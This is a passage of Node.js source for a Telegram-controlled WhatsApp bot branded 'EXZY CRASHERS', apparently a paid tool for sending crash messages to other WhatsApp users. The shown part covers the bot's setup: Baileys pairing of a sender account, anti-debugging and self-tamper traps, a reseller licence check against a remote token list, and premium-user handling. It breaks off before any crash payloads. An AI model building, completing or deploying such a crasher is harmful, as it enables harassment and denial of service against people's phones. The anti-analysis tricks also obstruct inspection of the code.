const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const MENU_AUDIO = "./Exzy Sound/exzy.mp3";
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/ikky161/ikoyy/refs/heads/main/token.json';
const thumbnailUrl = "https://gangalink.vercel.app/i/yt89gkhb";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.blue(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- ＥＸＺＹ ＣＲＡＳＨＥＲＳ

╰➤ INFORMATION:
 ▢ Developer: @ikkyexzy
 ▢ Version: 4.0 Beta
 ▢ Status: Bot Connected
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.blue(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- ＥＸＺＹ ＣＲＡＳＨＥＲＳ

╰➤ INFORMATION:
 ▢ Developer: @ikkyexzy
 ▢ Version: 4.0 Beta
 ▢ Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.blue(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- ＥＸＺＹ ＣＲＡＳＨＥＲＳ

╰➤ INFORMATION:
 ▢ Developer: @ikkyexzy
 ▢ Version: 4.0 Beta
 ▢ Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.blue(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- ＥＸＺＹ ＣＲＡＳＨＥＲＳ

╰➤ INFORMATION:
 ▢ Developer: @ikkyexzy
 ▢ Version: 4.0 Beta
 ▢ Status: No Access
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.blue(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- ＥＸＺＹ ＣＲＡＳＨＥＲＳ

╰➤ INFORMATION:
 ▢ Developer: @ikkyexzy
 ▢ Version: 4.0 Beta
 ▢ Status: No Access
  
  Gagal menghubungkan ke server, Akses ditolak
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.blue(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- ＥＸＺＹ ＣＲＡＳＨＥＲＳ

╰➤ INFORMATION:
 ▢ Developer: @ikkyexzy
 ▢ Version: 4.0 Beta
 ▢ Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Netrality',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `<blockquote>
#- ＥＸＺＹ ＣＲＡＳＨＥＲＳ

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.blue(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- ＥＸＺＹ ＣＲＡＳＨＥＲＳ

╰➤ INFORMATION:
 ▢ Developer: @ikkyexzy
 ▢ Version: 4.0 Beta
 ▢ Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
